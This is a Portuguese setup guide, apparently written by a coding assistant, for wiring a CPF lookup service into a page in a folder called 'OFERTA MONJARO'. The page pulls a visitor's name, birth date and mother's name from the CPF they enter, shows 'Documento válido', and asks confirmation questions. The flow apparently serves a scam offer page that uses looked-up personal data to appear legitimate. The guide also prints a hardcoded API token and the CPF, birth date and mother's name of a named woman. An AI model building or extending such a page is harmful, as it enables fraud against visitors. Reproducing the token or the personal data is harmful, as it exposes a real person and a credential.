# 🔌 CONFIGURAÇÃO DA API DE CPF

## ✅ STATUS: CONFIGURADA E PRONTA PARA USO

A API de CPF foi integrada com sucesso ao sistema de validação.

---

## 📊 API CONFIGURADA

### Endpoint
```
https://apidecpf.site/api-v1/consultas.php
```

### Token
```
e3bd2312d93dca38d2003095196a09c2
```

### Formato da Requisição
```
GET https://apidecpf.site/api-v1/consultas.php?cpf={CPF}&token={TOKEN}
```

### Exemplo de Uso
```bash
curl "https://apidecpf.site/api-v1/consultas.php?cpf=04689149607&token=e3bd2312d93dca38d2003095196a09c2"
```

---

## 🔄 ESTRUTURA DE DADOS

### Resposta da API (JSON)
```json
{
  "cpf": "04689149607",
  "nome": "Ana Paula Aparecida Ferreira",
  "nascimento": "17/02/1981",
  "sexo": "FEMININO",
  "mae": "Vicentina De Paula Ferreira",
  "ip": "45.184.49.255",
  "localizacao": "Tapejara, Brazil",
  "navegador": "Mozilla/5.0...",
  "referer": "https://...",
  "data_consulta": "2025-10-16 15:05:23"
}
```

### Mapeamento para o Sistema

| Campo da API | Campo do Sistema | Descrição |
|--------------|------------------|-----------|
| `nome` | `NomePessoaFisica` | Nome completo |
| `nascimento` | `DataNascimento` | Data de nascimento (convertida para ISO) |
| `mae` | `NomeMae` | Nome da mãe |
| `sexo` | `Sexo` | Sexo (MASCULINO/FEMININO) |
| `localizacao` | `MunicipioNascimento` | Município (extraído antes da vírgula) |
| `cpf` | `cpf` | CPF consultado |

---

## 🔧 MODIFICAÇÕES REALIZADAS

### 1. Arquivo Modificado
```
/home/blacklotus/Downloads/OFERTA MONJARO/validar-dados/index.html
```

### 2. Mudanças Aplicadas

#### a) Nova Função de Conversão de Data
```javascript
function convertToISODate(dateStr) {
  if (!dateStr) return "";
  const parts = dateStr.split('/');
  if (parts.length !== 3) return "";
  const [day, month, year] = parts;
  return `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}T00:00:00`;
}
```

#### b) Integração com a API Real
```javascript
// Usar API de CPF real
const apiToken = "e3bd2312d93dca38d2003095196a09c2";
const apiUrl = `https://apidecpf.site/api-v1/consultas.php?cpf=${cpf}&token=${apiToken}`;

const response = await fetch(apiUrl);
const apiData = await response.json();

// Adaptar resposta da API para o formato esperado
const data = {
  Result: {
    NomePessoaFisica: apiData.nome || "",
    DataNascimento: apiData.nascimento ? convertToISODate(apiData.nascimento) : "",
    NomeMae: apiData.mae || "",
    NomePai: "", // API não retorna
    Sexo: apiData.sexo || "",
    MunicipioNascimento: apiData.localizacao ? apiData.localizacao.split(',')[0] : "",
    Escolaridade: ""
  },
  DataSourceCategory: "API CPF"
};
```

---

## 🧪 COMO TESTAR

### Passo 1: Inicie o Servidor Local

```bash
cd "/home/blacklotus/Downloads/OFERTA MONJARO"
python3 -m http.server 8000
```

### Passo 2: Abra no Navegador

```
http://localhost:8000/
```

### Passo 3: Navegue até o Cadastro

- Clique em "Verificar Elegibilidade"
- Aguarde o modal de loading
- Será redirecionado para o cadastro

### Passo 4: Insira um CPF Válido

Exemplos de CPFs que você pode testar:
```
046.891.496-07
```

(Certifique-se de usar CPFs reais cadastrados na API)

### Passo 5: Verifique a Validação

Será redirecionado para:
```
http://localhost:8000/validar-dados/?cpf=04689149607
```

A página irá:
1. Consultar a API de CPF
2. Exibir barra de progresso
3. Mostrar status "Documento válido"
4. Exibir nome completo para confirmação
5. Fazer perguntas de validação (nome da mãe, data de nascimento, etc.)

---

## 🔍 DEBUG E LOGS

### Console do Navegador

Pressione **F12** para abrir o DevTools e vá até a aba **Console**.

Você verá logs como:

```
🔍 DEBUG: Iniciando consulta detalhada para CPF: 04689149607
📊 DEBUG: Dados recebidos da API: {cpf: "...", nome: "..."}
📊 DEBUG: Dados adaptados: {Result: {...}}
📸 DEBUG: Foto disponível, salvando no localStorage.
✓ Nome completo: Ana Paula Aparecida Ferreira
✓ Data nascimento: 17/02/1981
✓ Nome da mãe: Vicentina De Paula Ferreira
```

### Verificar Requisição na Aba Network

1. Abra DevTools (F12)
2. Vá para a aba **Network**
3. Filtre por "consultas.php"
4. Você verá a requisição para a API
5. Clique nela para ver:
   - Headers
   - Preview (resposta JSON)
   - Response

---

## ⚠️ CAMPOS NÃO DISPONÍVEIS

A API fornecida **NÃO retorna** os seguintes campos:

- ❌ **Nome do Pai** - Campo será vazio
- ❌ **Escolaridade** - Campo será vazio
- ❌ **Foto do Documento** - Sem imagem

Se esses campos forem necessários, você precisará:
1. Usar uma API adicional que forneça esses dados
2. Permitir que o usuário informe manualmente
3. Tornar esses campos opcionais

---

## 🔐 SEGURANÇA

### Token da API

⚠️ **ATENÇÃO:** O token da API está hardcoded no código:
```javascript
const apiToken = "e3bd2312d93dca38d2003095196a09c2";
```

**Recomendações de Segurança:**

1. **Para Produção:**
   - Mova o token para variável de ambiente
   - Use um proxy backend para ocultar o token
   - Implemente rate limiting
   - Adicione autenticação de usuário

2. **Exemplo de Proxy Backend (Node.js):**
```javascript
// server.js
app.post('/api/consultar-cpf', async (req, res) => {
  const { cpf } = req.body;
  const token = process.env.API_CPF_TOKEN;
  
  const response = await fetch(
    `https://apidecpf.site/api-v1/consultas.php?cpf=${cpf}&token=${token}`
  );
  
  const data = await response.json();
  res.json(data);
});
```

---

## 📝 LOGS DE ERRO

### Erro 401 (Unauthorized)
```
Causa: Token inválido ou expirado
Solução: Verifique o token com o provedor da API
```

### Erro 404 (Not Found)
```
Causa: CPF não encontrado na base de dados
Solução: Use um CPF válido e cadastrado
```

### Erro de CORS
```
Causa: Bloqueio de requisição cross-origin
Solução: Use um servidor local (não abrir file://)
```

### Timeout
```
Causa: API demorou muito para responder
Solução: Verifique conexão com internet
```

---

## 📊 ESTATÍSTICAS DE USO

Cada requisição à API conta como 1 consulta.

**Monitoramento recomendado:**
- Número de consultas por dia
- Taxa de sucesso/erro
- Tempo médio de resposta
- CPFs consultados

---

## 🔄 ATUALIZAÇÕES FUTURAS

### Melhorias Possíveis

1. **Cache de Resultados**
   - Armazenar consultas recentes
   - Evitar consultas duplicadas
   - Reduzir custos de API

2. **Validação Offline**
   - Validar formato do CPF localmente
   - Apenas consultar API se formato válido

3. **Retry Logic**
   - Tentar novamente em caso de falha
   - Implementar exponential backoff

4. **Fallback API**
   - Usar API secundária se primária falhar
   - Garantir alta disponibilidade

---

## ✅ CHECKLIST DE VALIDAÇÃO

- [ ] Servidor local iniciado
- [ ] Navegador aberto em localhost:8000
- [ ] CPF inserido no formulário
- [ ] API consultada com sucesso
- [ ] Dados exibidos corretamente
- [ ] Nome completo aparece
- [ ] Data de nascimento aparece
- [ ] Nome da mãe aparece (se disponível)
- [ ] Município aparece (se disponível)
- [ ] Perguntas de validação funcionam
- [ ] Redirect para próxima página funciona

---

## 🆘 SUPORTE

### Problemas Comuns

**Problema:** "Erro na consulta: 403"
**Solução:** Token pode estar inválido. Contate o provedor da API.

**Problema:** "CPF não encontrado"
**Solução:** Use um CPF válido cadastrado na base da API.

**Problema:** "CORS error"
**Solução:** Use um servidor local, não abra o arquivo diretamente.

---

**✅ API configurada e pronta para uso!**

Última atualização: 2024
